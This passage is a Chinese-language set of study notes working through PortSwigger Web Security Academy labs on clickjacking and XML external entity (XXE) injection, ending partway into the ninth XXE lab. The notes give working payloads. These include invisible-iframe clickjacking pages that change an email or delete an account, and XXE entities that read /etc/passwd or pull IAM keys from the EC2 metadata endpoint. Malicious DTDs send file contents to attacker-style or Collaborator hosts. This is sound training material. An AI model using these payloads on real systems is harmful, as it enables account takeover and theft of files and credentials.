1、本实验扩展了实验中的基本点击劫持示例：基本的点击劫持与CSRF令牌保护。实验的目标是通过使用URL参数预填充表单并诱使用户无意中单击“Update email”按钮来更改用户的电子邮件地址。

2、解决实验：制作一些HTML来构建帐户页面，并欺骗用户通过单击“单击我”诱饵来更新他们的电子邮件地址

3、已有账号：wiener:peter
```

### 步骤

登录账号

转到利用漏洞攻击服务器，对模板进行以下调整：

1、将YOUR-LAB-ID替换为自己实验室ID，以便URL指向目标网站的用户帐户页面，其中包含"更新电子邮件"表单
2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。
3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，使"更新电子邮件"按钮和"测试我"诱饵动作对齐（我们建议分别为450px和80px）
4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用。

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
 
 
我的是：
 
<style>
iframe {
    position:relative;
    width:500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
div {
    position:absolute;
    top:450px;
    left:80px;
    z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://0a4c001a03ab3eb683b0198d001e00d4.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

补充下，以下这个是用户修改邮箱的链接：

```
https://0a4c001a03ab3eb683b0198d001e00d4.web-security-academy.net/my-account?email=hacker@attacker-website.com
```

## Lab3

### 前置

帧分解脚本

1、只要网站可以被框定，点击劫持攻击就有可能发生。因此预防技术基于限制网站的成帧能力。通过Web浏览器制定的常见客户端保护是使用帧破坏或帧中断脚本。这些可以通过专有浏览器JavaScript插件或扩展（如NoScript）实现

```
脚本通常经过精心编制，以便执行以下部分或全部行为：
1、检查并强制当前应用程序窗口是主窗口或顶部窗口，
2、使所有帧可见，
3、防止点击不可见帧，
4、拦截并标记对用户的潜在点击劫持攻击。
```

2、帧破坏技术通常是特定于浏览器和平台的，并且由于HTML的灵活性，它们通常可以被攻击者绕过。由于framebuster是JavaScript，因此浏览器的安全设置可能会阻止其运行，甚至浏览器可能不支持JavaScript。攻击者对付frame buster的一个有效的变通方法是使用HTML5 iframe sandbox属性。当使用 allow-forms 或 allow-scripts 值设置此值并省略allow-top-navigation值时，framebuster脚本可以被中和，因为iframe无法检查它是否是顶部窗口：

```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

两者allow-forms以及allow-scripts值允许iframe内的指定操作，但禁用顶级导航。这将禁止帧破坏行为，同时允许目标站点内的功能。 

### 题目

实验3：使用帧破坏脚本进行点击劫持

Lab: Clickjacking with a frame buster script

```
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```

```
信息：

1、本实验室受框架破坏器保护，可防止网站被框架破坏。

2、解决实验：制作一些HTML来构建帐户页面，并欺骗用户通过点击“点击我”来更改他们的电子邮件地址

3、已有账号：wiener:peter
```

### 步骤

登录账号

转到利用漏洞攻击服务器，对模板进行以下调整：

1、将YOUR-LAB-ID替换为自己实验室ID，以便URL指向目标网站的用户帐户页面，其中包含"更新电子邮件"表单
2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。
3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，使"更新电子邮件"按钮和"测试我"诱饵动作对齐（分别为450px和80px）
4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用。

5、注意sandbox ="allow-forms"属性的使用，该属性中和了framebuster脚本

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
 
我的是：
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a51004a03fefa8e848fdcac004f0027.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

补充一下，这里的**攻击利用服务器**还是模拟受害者访问触发我们构造的恶意页面

<img src=".\图片\Snipaste_2023-07-30_10-12-50.png" alt="Snipaste_2023-07-30_10-12-50" style="zoom:80%;" />

## Lab4

实验4：利用点击劫持漏洞触发基于DOM的XSS

1、点击劫持被视为一种独立的攻击。从历史上看，点击劫持被用来执行诸如在Facebook页面上增加"喜欢"之类的行为。但当点击劫持被用作另一种攻击的载体时，点击劫持的真正威力就显现出来了，如 DOM XSS攻击。假设攻击者首先识别了XSS漏洞，那么这种组合攻击的实现相对简单。然后，XSS攻击与iframe目标URL结合，以便用户单击按钮或链接，从而执行DOM XSS攻击。 

### 题目

```
Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
PRACTITIONER

This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.
```

### 解答

```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 
我的是：
<style>
	iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:80px;
        z-index: 1;
	}
</style>
<div>click me</div>
<iframe
src="https://0a6100d704d5df4f821eb52800aa001e.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Lab5

实验5：多步点击劫持

```
Lab: Multistep clickjacking
PRACTITIONER

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter
```

```
信息：

1、本实验包含一些受CSRF令牌保护的帐户功能，还包含一个确认对话框，用于防止点击劫持

2、解决实验：设计一个攻击，通过单击“先单击我”和“下一步单击我”诱饵操作，诱骗用户单击删除帐户按钮和确认对话框（需要使用两个元素）

3、已有账号：wiener:peter
```

### 解答

```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
 
我的是：
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:215px;
	}
</style>
<div class="firstClick">click me first</div>
<div class="secondClick">click me next</div>
<iframe src="https://0a460061032b095d82d560d1008c0023.web-security-academy.net/my-account"></iframe>
```

<img src=".\图片\Snipaste_2023-07-31_09-43-35.png" alt="Snipaste_2023-07-31_09-43-35" style="zoom:80%;" />

https://blog.csdn.net/qq_53079406/article/details/128708798)

# XXE

[(162条消息) 【burpsuite安全练兵场-服务端10】XML外部实体注入（XXE注入）-9个实验（全）_xml注入测试_黑色地带(崛起)的博客-CSDN博客](https://blog.csdn.net/qq_53079406/article/details/128642758)

## Lab1

### 前置

1、利用XXE检索文件

要执行从服务器文件系统检索任意文件的XXE注入攻击，需要以两种方式修改提交的XML：

```
    1、引入（或编辑）DOCTYPE元素，该元素定义包含文件路径的外部实体。
    2、编辑应用程序响应中返回的XML中的数据值，以使用定义的外部实体。
```

2、对于现实世界中的XXE漏洞，提交的XML中通常会有大量的数据值，其中任何一个都可能在应用程序的响应中使用。要系统地测试XXE漏洞，通常需要单独测试XML中的每个数据节点，方法是使用定义的实体并查看它是否出现在响应中

3、如购物应用程序通过向服务器提交以下XML来检查产品的库存水平：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

若应用程序对XXE攻击不执行任何特定的防御，因此可以通过提交以下XXE有效负载来利用XXE漏洞检索/etc/passwd文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

此XXE有效负载定义外部实体&xxe，其值为/etc/passwd文件中的实体并使用产品ID值。这将导致应用程序的响应包含文件的内容：

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### 题目

实验1：利用XXE使用外部实体检索文件

```
Lab: Exploiting XXE using external entities to retrieve files
APPRENTICE

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file
```

```
信息：

本实验有一个“Check stock”特性，它解析XML输入并在响应中返回任何意外值。

要解决实验：注入一个XML外部实体来检索/etc/passwd文件的内容
```

### 解答

发现功能点  `Check stock`

<img src=".\图片\Snipaste_2023-07-31_10-15-55.png" alt="Snipaste_2023-07-31_10-15-55" style="zoom:80%;" />

抓包发现数据是用 XML 格式传输的，且有回显

<img src=".\图片\Snipaste_2023-07-31_10-17-43.png" alt="Snipaste_2023-07-31_10-17-43" style="zoom:80%;" />

XXE注入

在XML声明和stockCheck元素之间插入以下外部实体定义：

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

并修改回显地方： `&xxe`

最后为如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

<img src=".\图片\Snipaste_2023-07-31_10-22-33.png" alt="Snipaste_2023-07-31_10-22-33" style="zoom:80%;" />

## Lab2

### 前置

三、利用XXE进行SSRF攻击

1、除了检索敏感数据之外，XXE攻击的另一个主要影响是它们可用于执行服务器端请求伪造SSRF。这是一个潜在的严重漏洞，可诱使服务器端应用程序向服务器可以访问的任何URL发出HTTP请求。

2、要利用XXE漏洞执行SSRF攻击，需要使用要攻击的URL定义外部XML实体，并在数据值中使用定义的实体。如果可以在应用程序响应中返回的数据值中使用定义的实体，那么将能够从应用程序响应中的URL查看响应，从而获得与后端系统的双向交互。如果没有，那么将只能进行SSRF的盲攻击

3、XXE示例：外部实体将导致服务器向组织基础架构中的内部系统发出后端HTTP请求：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### 题目

Lab: Exploiting [XXE](https://portswigger.net/web-security/xxe) to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

```
信息：

本实验有一个"Check stock"特性，它解析XML输入并在响应中返回任何意外值

实验室服务器在默认URL（www.example.com）上运行（模拟的）EC2元数据端点http://169.254.169.254/。此终结点可用于检索有关实例的数据，其中一些数据可能是敏感的

解决实验：利用XXE漏洞执行SSRF攻击，从EC2元数据端点获取服务器的IAM秘密访问密钥
```

### 解答

```
XXE注入
在XML声明和stockCheck元素之间插入以下外部实体定义：

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

将 productId 号替换为对外部实体的引用:

&xxe;
```

<img src=".\图片\Snipaste_2023-07-31_10-37-20.png" alt="Snipaste_2023-07-31_10-37-20" style="zoom:80%;" />

得到路径 latest，迭代访问后得到完整路径

```
/latest/meta-data/iam/security-credentials/admin
```

于是得到访问数据

<img src=".\图片\Snipaste_2023-07-31_10-39-05.png" alt="Snipaste_2023-07-31_10-39-05" style="zoom:80%;" />

## Lab3

### 前置

盲XXE漏洞

#### 1、简述（查找和利用隐蔽的XXE漏洞）

1、XXE漏洞的许多实例是盲目的。这意味着应用程序不会在其响应中返回任何已定义的外部实体的值，因此不可能直接检索服务器端文件。

2、盲XXE漏洞仍然可以检测和利用，但需要更先进的技术。有时可以使用带外技术来查找漏洞，并利用它们来泄漏数据。有时候，可能会触发XML解析错误，从而导致在错误消息中泄漏敏感数据。 

#### 2、XXE盲注

Blind XXE漏洞出现在应用程序易受攻击的地方XXE注射液但不在其响应内返回任何定义的外部实体的值。这意味着直接检索服务器端文件是不可能的，因此盲XXE通常比常规XXE漏洞更难被利用

```
可以通过两种广泛的方式查找和利用隐蔽的XXE漏洞：
    1、触发带外网络交互，有时会在交互数据中泄漏敏感数据。
    2、通过错误消息包含敏感数据的方式触发XML解析错误。
```

#### 3、使用带外技术

1、通常可以使用与XXE SSRF攻击相同的技术来检测XXE盲注，但会触发与控制的系统的带外网络交互。

```
例如，可按如下方式定义外部：
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
将在XML中的数据值中使用定义的实体
```

此XXE攻击使服务器向指定URL发出后端HTTP请求。攻击者可以监视生成的DNS查找和HTTP请求，从而检测到XXE攻击成功。

### 题目

实验3：带外交互的盲XXE

```
Lab: Blind XXE with out-of-band interaction
PRACTITIONER

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
```

```
信息：

本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。

可以通过触发与外部域的带外交互来检测隐蔽XXE漏洞。

解决实验：使用外部实体使XML解析器向Burp Collaborator发出DNS查找和HTTP请求
```

### 解答

1、抓包观察

<img src=".\图片\Snipaste_2023-07-31_10-46-38.png" alt="Snipaste_2023-07-31_10-46-38" style="zoom:80%;" />

2、XXE注入

BP---BC客户端---“Copy to clipboard”负载复制到剪贴板（客户端窗口保持打开状态）

类似 dnslog 平台

```
9akkf2r1p6opbvygad7jyey0crih66.burpcollaborator.net
```

3、在XML声明和stockCheck元素之间插入以下外部实体定义

```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
 
我的是：
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://9akkf2r1p6opbvygad7jyey0crih66.burpcollaborator.net"> ]>
```

将productId编号替换为对外部实体的引用：

```xml
&xxe;
```

完整格式为

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://9akkf2r1p6opbvygad7jyey0crih66.burpcollaborator.net"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

观察到平台接收到 dns 请求

<img src=".\图片\Snipaste_2023-07-31_10-50-00.png" alt="Snipaste_2023-07-31_10-50-00" style="zoom:80%;" />

## Lab4

### 前置

一般使用常规实体的XXE攻击会被阻止，因为应用程序进行了一些输入验证，或者使用的XML解析器进行了一些加固。在这种情况下，可以改用XML参数实体。

XML参数实体是一种特殊类型的XML实体，只能在DTD中的其他位置引用

1）XML参数实体的声明在实体名称前包含百分比字符：

```
<!ENTITY % myparameterentity "my parameter entity value" >
```

2）使用%百分比字符而不是通常的&号引用参数实体：

```
%myparameterentity;
```

3）XML参数实体使用带外检测来测试盲XXE：

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

此XXE有效负载声明一个名为xxe然后使用DTD中的实体。这将导致向攻击者的域发出DNS查找和HTTP请求，从而验证攻击是否成功

### 题目

实验4：通过XML参数实体进行带外交互的盲XXE

```
Lab: Blind XXE with out-of-band interaction via XML parameter entities
PRACTITIONER

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
```

```
信息：

本实验有一个“Check stock”功能，该功能可以解析XML输入，但不会显示任何意外值，并阻止包含常规外部实体的请求

解决实验：使用一个参数实体使XML解析器向Burp Collaborator发出DNS查找和HTTP请求
```

### 解答

与上一题类似，完整 xml 如下

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2vy6w288ymns5ksn4sp3yn5bu20soh.burpcollaborator.net"> %xxe; ]><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```

<img src=".\图片\Snipaste_2023-07-31_11-03-56.png" alt="Snipaste_2023-07-31_11-03-56" style="zoom:80%;" />

## Lab5

### 前置

利用盲XXE将数据渗透到带外

1、通过带外技术检测一个隐蔽的XXE漏洞是非常好的，但它实际上并不能证明该漏洞是如何被利用的。攻击者真正想要实现的是泄露敏感数据。这可以通过隐蔽的XXE漏洞实现，但它涉及攻击者在其控制的系统上托管恶意DTD，然后从带内XXE有效负载内调用外部DTD。

```
一个恶意DTD的示例，该DTD可用于泄漏/etc/passwd文件的内容：
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
 
此DTD执行以下步骤：
    1、定义名为的XML参数实体file，包含的内容/etc/passwd文件。
    2、定义名为的XML参数实体eval，包含另一个XML参数实体的动态声明，该实体名为exfiltrate。该exfiltrate将通过向攻击者的Web服务器发出包含file URL查询字符串中的实体。
    3、使用eval实体的动态声明，它将导致exfiltrate要执行的实体。
    4、使用exfiltrate实体，以便通过请求指定的URL来计算其值。
```

2、然后攻击者必须在他们控制的系统上托管恶意DTD，通常是将其加载到自己的Web服务器上。

```
例如，攻击者可能在以下URL提供恶意DTD：
http://web-attacker.com/malicious.dtd
```

3、最后攻击者必须向易受攻击的应用程序提交以下XXE有效负载：

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

4、这个XXE有效负载声明了一个名为xxe的XML参数实体，然后在DTD中使用该实体。这将导致XML解析器从攻击者的服务器获取外部DTD并内联解释它。然后执行恶意DTD中定义的步骤，并将/etc/passwd文件传输到攻击者的服务器

5、此技术可能不适用于某些文件内容，包括/etc/passwd文件中包含的换行符。因为一些XML解析器使用API来获取外部实体定义中的URL，该API验证允许出现在URL中的字符。在这种情况下，可以使用FTP协议代替HTTP。有时无法过滤包含换行符的数据，因此可以将目标改为/etc/hostname之类的文件

### 题目

实验5：利用XXE盲注使用恶意外部DTD泄漏数据

```
Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
PRACTITIONER

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.
```

```
信息：

本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。

要解决实验问题，请将/etc/hostname文件的内容导出。
```

### 答案

先 burp 生成本地域名

```
pa3cegqmosyb5n73c0pr8komvd13ps.burpcollaborator.net
```

 单击靶场页面 "Go to exploit server"（转到利用漏洞服务器）并将恶意DTD文件保存在您的服务器上，将Burp Collaborator有效负载放入恶意DTD文件：

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://pa3cegqmosyb5n73c0pr8komvd13ps.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil; 
```

单击"view exploit"并记下URL（直接上传后有显示）

```
https://exploit-0a1c007b0498fee2855673be01850015.exploit-server.net/exploit
```

再找到xml的漏洞点抓包，XXE注入，在XML声明和stockCheck元素之间插入以下外部实体定义

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 
我的是：
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1c007b0498fee2855673be01850015.exploit-server.net/exploit"> %xxe;]>
```

完整如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1c007b0498fee2855673be01850015.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```

在 burp 里收到数据  `hostname`

<img src=".\图片\Snipaste_2023-07-31_12-23-42.png" alt="Snipaste_2023-07-31_12-23-42" style="zoom:80%;" />

## Lab6

```
实验6：利用盲态XXE通过错误消息检索数据
信息：

本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。

解决实验：使用外部DTD触发错误消息，以显示/etc/passwd文件的内容。

本实验包含一个链接，该链接指向可托管恶意DTD的其他域中的漏洞攻击服务器。
```

与上一题差不多

```
上传恶意DTD文件：
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 
我的是：
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aaa00cb049df40780b5981a014c0087.exploit-server.net/exploit"> %xxe;]>
```

答案如下

<img src=".\图片\Snipaste_2023-07-31_12-32-28.png" alt="Snipaste_2023-07-31_12-32-28" style="zoom:80%;" />

这个好像有点像sqli报错注入吧

## Lab7

### 前置

查找XXE注入的隐藏攻击面：

XXE注入漏洞的攻击面在许多情况下是显而易见的，因为应用程序的正常HTTP通信量包括含有XML格式数据的请求。在其他情况下，攻击面不太明显。但如果在正确的地方查看，会发现XXE攻击出现在不包含任何XML的请求中

XInclude攻击：

1、一些应用程序接收客户端提交的数据，在服务器端将其嵌入到XML文档中，然后解析该文档。当客户端提交的数据被放入后端SOAP请求中，然后由后端SOAP服务处理时，就会出现这种情况。

2、在这种情况下，不能执行典型的XXE攻击，因为不能控制整个XML文档，因此不能定义或修改文件DOCTYPE元素。但也许可以使用XInclude替代。XInclude是XML规范的一部分，它允许从子文档构建XML文档。可以放置一个XInclude XML文档中的任何数据值内的攻击，因此在仅控制放置在服务器端XML文档中的单个数据项的情况下可以执行攻击

3、要执行 XInclude 攻击，需要引用 XInclude 命名空间并提供希望包含的文件的路径

```
例如：
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### 题目

```
Lab: Exploiting XInclude to retrieve files
PRACTITIONER

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.
```

```
信息：

1、本实验有一个“Check stock”特性，它将用户输入嵌入到服务器端XML文档中，然后解析该文档。

2、因为不能控制整个XML文档，所以不能定义DTD来发起典型的XXE攻击。

3、完成实验：插入XInclude语句以检索/etc/passwd文件的内容。

4、默认情况下，XInclude会尝试将包含的文档解析为XML。由于/etc/passwd不是有效的XML，因此需要向XInclude指令添加一个额外的属性来更改此行为。
```

### 答案

XXE注入

将productId参数的值设置为（storeid的参数测试行不通）

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

<img src=".\图片\Snipaste_2023-07-31_12-42-02.png" alt="Snipaste_2023-07-31_12-42-02" style="zoom:80%;" />

## Lab8

### 前置

通过文件上传进行XXE攻击

1、一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML的格式的例子有DOCX这样的办公文档格式和SVG这样的图像格式。

2、如应用程序可能允许用户上载图像，并在上载后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG之类的格式，所使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，攻击者可以提交恶意SVG图像，从而到达XXE漏洞的隐藏攻击面。 

### 题目

实验8：通过图像文件上传利用XXE

```
Lab: Exploiting XXE via image file upload
PRACTITIONER

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
```

```
信息：

本实验允许用户将头像附加到评论中，并使用Apache Batik库处理头像图像文件。

完成实验：上载一个映像，其中显示处理后的/etc/hostname文件的内容。然后使用“Submit solution”按钮提交服务器主机名的值。
```

### 答案

创建包含以下内容的本地SVG图像：

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

<img src=".\图片\Snipaste_2023-07-31_12-46-17.png" alt="Snipaste_2023-07-31_12-46-17" style="zoom:80%;" />

再到靶场博客里的评论功能里上传图像

<img src=".\图片\Snipaste_2023-07-31_12-49-00.png" alt="Snipaste_2023-07-31_12-49-00" style="zoom:80%;" />

提交后查看图片地址（edge浏览器显示不出来，chrome可以）

<img src=".\图片\Snipaste_2023-07-31_12-52-44.png" alt="Snipaste_2023-07-31_12-52-44" style="zoom:80%;" />

## Lab9

### 前置

通过改变本地DTD的用途来利用盲XXE

1、前面的技术可以很好地用于外部DTD，但通常不能用于在文件`DOCTYPE`元素。因为该技术涉及在另一个参数实体的定义中使用XML参数实体。根据XML规范，这在外部DTD中是允许的，但在内部DTD中不允许。(大多数解析器不会允许）

2、当带外交互被阻止时，不能通过带外连接泄漏数据，也不能从远程服务器加载外部DTD。在这种情况下，由于XML语言规范中的漏洞，仍然可能触发包含敏感数据的错误消息。如果文档的DTD混合使用内部和外部DTD声明，则内部DTD可以重定义在外部DTD中声明的实体。当发生这种情况时，对在另一个参数实体的定义中使用XML参数实体的限制就会放松

3、意味着攻击者可以使用基于误差的XXE技术（error-based XXE ），前提是它们使用的XML参数实体是重新定义在外部DTD中声明的实体。当然，如果阻塞了带外连接，则无法从远程位置加载外部DTD。相反，它需要是应用程序服务器本地的外部DTD文件。从本质上讲，攻击涉及调用一个碰巧存在于本地文件系统上的DTD文件，并重新调整其用途，以触发包含敏感数据的解析错误的方式重新定义现有实体。

4、例如，假设服务器文件系统上的以下位置有一个DTD文件/usr/local/app/schema.dtd，并且此DTD文件定义了一个名为custom_entity。

```
攻击者可以触发XML解析错误消息，该消息包含/etc/passwd文件，方法是提交如下所示的混合DTD： 
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
 
此DTD执行以下步骤：
    1、定义名为的XML参数实体local_dtd，包含服务器文件系统上存在的外部DTD文件的内容。
    2、重新定义名为custom_entity，它已在外部DTD文件中定义。实体被重新定义为包含基于错误XXE攻击这已经描述过了，用于触发包含/etc/passwd文件。
    3、使用local_dtd，以便解释外部DTD，包括custom_entity实体。这将产生所需的错误消息。
```

5、查找要重新使用的现有DTD文件

由于这种XXE攻击涉及到改变服务器文件系统上现有DTD的用途，因此关键的要求是找到合适的文件。这其实很简单。因为应用程序返回XML解析器抛出的任何错误消息，所以只需尝试从内部DTD中加载本地DTD文件，就可以轻松地枚举这些文件。

```
例如，使用GNOME桌面环境的Linux系统通常在/usr/share/yelp/dtd/docbookx.dtd中有一个DTD文件。可以通过提交以下XXE有效负载来测试此文件是否存在，如果文件丢失，则会导致错误：
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

在测试了公用DTD文件列表以定位存在的文件后，需要获取该文件的副本并对其进行审阅以查找可重定义的图元。由于许多包含DTD文件的常用系统都是开放源代码的，因此通常可以通过Internet搜索快速获得文件的副本

### 题目

实验9：利用XXE通过改变本地DTD的用途来检索数据

```
Lab: Exploiting XXE to retrieve data by repurposing a local DTD
EXPERT

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

Hint
Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.
```

```
信息：

